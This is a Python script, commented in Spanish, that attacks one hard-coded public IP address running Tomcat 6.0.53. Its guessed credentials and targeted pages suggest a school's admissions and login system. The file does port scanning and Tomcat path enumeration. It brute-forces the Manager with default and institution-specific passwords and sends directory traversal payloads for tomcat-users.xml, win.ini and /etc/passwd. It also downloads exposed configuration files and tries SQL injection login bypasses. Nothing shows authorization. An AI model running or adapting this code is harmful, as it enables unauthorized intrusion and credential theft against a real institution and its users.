#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SCANNER AVANZADO TOMCAT 6.0.53 - Windows 11
Autor: Estudiante ITI
Target: 189.254.143.102
"""

import requests
import threading
import socket
import base64
import sys
import time
from urllib.parse import urljoin
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Deshabilitar advertencias SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class TomcatScanner:
    def __init__(self, target):
        self.target = target
        self.base_url = f"https://{target}"
        self.http_url = f"http://{target}"
        self.session = requests.Session()
        self.session.verify = False
        self.results = {
            'puertos_abiertos': [],
            'rutas_encontradas': [],
            'vulnerabilidades': [],
            'credenciales': [],
            'archivos_config': []
        }
    
    def banner(self):
        print("""
╔═══════════════════════════════════════════════╗
║           SCANNER TOMCAT 6.0.53              ║
║             (Windows 11 - ITI)               ║
║      Target: 189.254.143.102                 ║
╚═══════════════════════════════════════════════╝
        """)
    
    def escanear_puertos(self):
        """Escaneo completo de puertos"""
        print("[*] Escaneando puertos...")
        puertos_comunes = [80, 443, 8080, 8009, 8005, 8443, 8081, 8090]
        
        def probar_puerto(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                resultado = sock.connect_ex((self.target, port))
                sock.close()
                if resultado == 0:
                    self.results['puertos_abiertos'].append(port)
                    print(f"[+] Puerto {port} abierto")
            except:
                pass
        
        threads = []
        for port in puertos_comunes:
            t = threading.Thread(target=probar_puerto, args=(port,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
    
    def escanear_rutas_tomcat(self):
        """Escaneo de rutas comunes de Tomcat"""
        print("[*] Escaneando rutas Tomcat...")
        
        rutas_tomcat = [
            "/", "/manager/html", "/manager/status", "/manager/jmxproxy",
            "/host-manager/html", "/docs/", "/examples/", "/admin/",
            "/webdav/", "/jsp/", "/servlets-examples/", "/tomcat-docs/",
            "/balancer", "/cluster", "/status", "/test/", "/debug/",
            "/jsp-examples/", "/servlet/", "/SITO/", "/misitio/",
            "/jsp/escolar/", "/jsp/admin/", "/jsp/login.jsp",
            "/jsp/index.jsp", "/jsp/cerrar_sesion.jsp"
        ]
        
        for ruta in rutas_tomcat:
            for protocolo in [self.base_url, self.http_url]:
                try:
                    url = f"{protocolo}{ruta}"
                    response = self.session.get(url, timeout=5)
                    
                    if response.status_code != 404:
                        estado = "Protegido" if response.status_code in [401, 403] else "Accesible"
                        print(f"[+] {url} - {response.status_code} ({estado})")
                        
                        self.results['rutas_encontradas'].append({
                            'url': url,
                            'status': response.status_code,
                            'titulo': self.extraer_titulo(response.text)
                        })
                        
                        # Detectar vulnerabilidades
                        self.detectar_vulnerabilidades(url, response)
                        
                except Exception as e:
                    pass
    
    def extraer_titulo(self, html):
        """Extraer título de la página"""
        import re
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1) if match else "Sin título"
    
    def detectar_vulnerabilidades(self, url, response):
        """Detectar vulnerabilidades específicas"""
        # Directorios peligrosos accesibles
        rutas_peligrosas = ['/examples/', '/docs/', '/webdav/']
        if any(ruta in url for ruta in rutas_peligrosas):
            self.results['vulnerabilidades'].append(f"Directorio expuesto: {url}")
        
        # Información sensible en respuestas
        info_sensible = ['password', 'usuario', 'database', 'jdbc', 'connection']
        if any(info in response.text.lower() for info in info_sensible):
            self.results['vulnerabilidades'].append(f"Info sensible en: {url}")
    
    def fuerza_bruta_manager(self):
        """Fuerza bruta al Tomcat Manager"""
        print("[*] Intentando fuerza bruta al Manager...")
        
        credenciales = [
            # Credenciales por defecto Tomcat
            ('admin', 'admin'), ('tomcat', 'tomcat'), ('admin', 'tomcat'),
            ('admin', ''), ('tomcat', ''), ('admin', 'password'),
            ('root', 'root'), ('admin', '123456'), ('tomcat', 'tomcat'),
            
            # Posibles credenciales UTSLP
            ('hnieto', 'hnieto'), ('hnieto', 'utslp'), ('admin', 'utslp'),
            ('sito', 'sito'), ('sito', 'SITO2024'), ('administrator', 'admin'),
            ('webmaster', 'webmaster'), ('test', 'test'), ('demo', 'demo')
        ]
        
        for user, password in credenciales:
            try:
                url = f"{self.base_url}/manager/html"
                response = self.session.get(url, auth=(user, password))
                
                if response.status_code == 200 and "Tomcat Web Application Manager" in response.text:
                    print(f"[!] CREDENCIALES VÁLIDAS ENCONTRADAS: {user}:{password}")
                    self.results['credenciales'].append(f"{user}:{password}")
                    return True
                    
            except Exception as e:
                pass
        
        print("[-] No se encontraron credenciales válidas")
        return False
    
    def explotar_ejemplos(self):
        """Explotar directorio /examples/"""
        print("[*] Explotando directorio /examples/...")
        
        # JSP samples vulnerables
        jsp_samples = [
            "/examples/jsp/include/include.jsp",
            "/examples/jsp/jsp2/tagfiles/hello.jsp",
            "/examples/servlets/servlet/RequestParamExample",
            "/examples/servlets/servlet/SessionExample"
        ]
        
        for sample in jsp_samples:
            try:
                url = f"{self.base_url}{sample}"
                response = self.session.get(url)
                
                if response.status_code == 200:
                    print(f"[+] JSP sample accesible: {sample}")
                    
                    # Probar directory traversal
                    payloads = [
                        "?page=../../../../conf/tomcat-users.xml",
                        "?file=../../../../windows/win.ini",
                        "?page=../../../../etc/passwd",
                        "?url=file:///c:/windows/system.ini"
                    ]
                    
                    for payload in payloads:
                        traversal_url = url + payload
                        resp = self.session.get(traversal_url)
                        if "tomcat" in resp.text.lower() or "password" in resp.text.lower():
                            print(f"[!] Directory traversal exitoso: {traversal_url}")
                            self.results['vulnerabilidades'].append(f"Traversal: {traversal_url}")
                            
            except Exception as e:
                pass
    
    def buscar_archivos_configuracion(self):
        """Buscar archivos de configuración"""
        print("[*] Buscando archivos de configuración...")
        
        archivos_config = [
            "/conf/tomcat-users.xml",
            "/conf/server.xml",
            "/conf/web.xml",
            "/conf/context.xml",
            "/WEB-INF/web.xml",
            "/META-INF/context.xml",
            "/jsp/WEB-INF/web.xml",
            "/SITO/WEB-INF/web.xml",
            "/manager/WEB-INF/web.xml"
        ]
        
        for archivo in archivos_config:
            for protocolo in [self.base_url, self.http_url]:
                try:
                    url = f"{protocolo}{archivo}"
                    response = self.session.get(url)
                    
                    if response.status_code == 200:
                        print(f"[!] Archivo de configuración expuesto: {url}")
                        self.results['archivos_config'].append(url)
                        
                        # Guardar contenido
                        with open(f"config_{archivo.replace('/', '_')}.txt", "w") as f:
                            f.write(response.text)
                            
                except Exception as e:
                    pass
    
    def escanear_javascript(self):
        """Analizar JavaScript en busca de información sensible"""
        print("[*] Analizando JavaScript...")
        
        try:
            # Obtener página principal
            response = self.session.get(self.base_url)
            
            # Buscar scripts
            import re
            scripts = re.findall(r'<script[^>]*src="([^"]*)"[^>]*>', response.text)
            
            for script in scripts:
                if script.startswith('/'):
                    script_url = f"{self.base_url}{script}"
                else:
                    script_url = f"{self.base_url}/{script}"
                
                try:
                    resp = self.session.get(script_url)
                    # Buscar información sensible
                    patrones = {
                        'emails': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                        'passwords': r'password[=:]\s*[\'"]?([^\'"\s]+)',
                        'urls': r'https?://[^\s\'"]+',
                        'database': r'(jdbc:|database|mysql|oracle|sqlserver)'
                    }
                    
                    for tipo, patron in patrones.items():
                        matches = re.findall(patron, resp.text, re.IGNORECASE)
                        if matches:
                            print(f"[!] {tipo.upper()} encontrado en {script}: {matches[:3]}")
                            
                except:
                    pass
                    
        except Exception as e:
            print(f"[-] Error analizando JS: {e}")
    
    def probar_sql_injection(self):
        """Probar SQL Injection en puntos clave"""
        print("[*] Probando SQL Injection...")
        
        puntos_prueba = [
            f"{self.base_url}/jsp/login.jsp",
            f"{self.base_url}/jsp/index.jsp",
            f"{self.base_url}/jsp/escolar/proceso_admision/proceso_interesado.jsp"
        ]
        
        payloads = [
            "admin' OR '1'='1'--",
            "' OR 1=1--",
            "admin' UNION SELECT 1,2,3--",
            "x' OR user_name != '"
        ]
        
        for punto in puntos_prueba:
            for payload in payloads:
                try:
                    data = {
                        'yUsuario': payload,
                        'xUsuario': payload,
                        'yAccion': 'login',
                        'xContrasena': 'test'
                    }
                    
                    response = self.session.post(punto, data=data)
                    
                    # Indicadores de SQLi exitoso
                    indicadores = ['solicita ficha', 'bienvenido', 'dashboard', 'admin']
                    if any(ind in response.text.lower() for ind in indicadores):
                        print(f"[!] POSIBLE SQL INJECTION EXITOSO en {punto}")
                        print(f"    Payload: {payload}")
                        self.results['vulnerabilidades'].append(f"SQLi: {punto}")
                        
                except Exception as e:
                    pass
    
    def generar_reporte(self):
        """Generar reporte completo"""
        print("\n" + "="*60)
        print("REPORTE COMPLETO DE ESCANEO")
        print("="*60)
        
        print(f"\n[PUERTOS ABIERTOS]")
        for puerto in self.results['puertos_abiertos']:
            print(f"  - Puerto {puerto}")
        
        print(f"\n[RUTAS ENCONTRADAS]")
        for ruta in self.results['rutas_encontradas']:
            print(f"  - {ruta['url']} ({ruta['status']}) - {ruta['titulo']}")
        
        print(f"\n[VULNERABILIDADES]")
        for vuln in self.results['vulnerabilidades']:
            print(f"  - {vuln}")
        
        print(f"\n[CREDENCIALES]")
        for cred in self.results['credenciales']:
            print(f"  - {cred}")
        
        print(f"\n[ARCHIVOS DE CONFIGURACIÓN]")
        for archivo in self.results['archivos_config']:
            print(f"  - {archivo}")
        
        # Guardar reporte en archivo
        with open("reporte_escaneo.txt", "w") as f:
            f.write("REPORTE DE ESCANEO TOMCAT 6.0.53\n")
            f.write("="*50 + "\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Fecha: {time.ctime()}\n\n")
            
            f.write("RESUMEN DE HALLAZGOS:\n")
            f.write(f"- Puertos abiertos: {len(self.results['puertos_abiertos'])}\n")
            f.write(f"- Rutas encontradas: {len(self.results['rutas_encontradas'])}\n")
            f.write(f"- Vulnerabilidades: {len(self.results['vulnerabilidades'])}\n")
            f.write(f"- Archivos de config: {len(self.results['archivos_config'])}\n")
        
        print(f"\n[+] Reporte guardado en: reporte_escaneo.txt")

def main():
    target = "189.254.143.102"
    
    scanner = TomcatScanner(target)
    scanner.banner()
    
    # Ejecutar escaneos
    scanner.escanear_puertos()
    scanner.escanear_rutas_tomcat()
    scanner.fuerza_bruta_manager()
    scanner.explotar_ejemplos()
    scanner.buscar_archivos_configuracion()
    scanner.escanear_javascript()
    scanner.probar_sql_injection()
    
    # Generar reporte
    scanner.generar_reporte()

if __name__ == "__main__":
    main()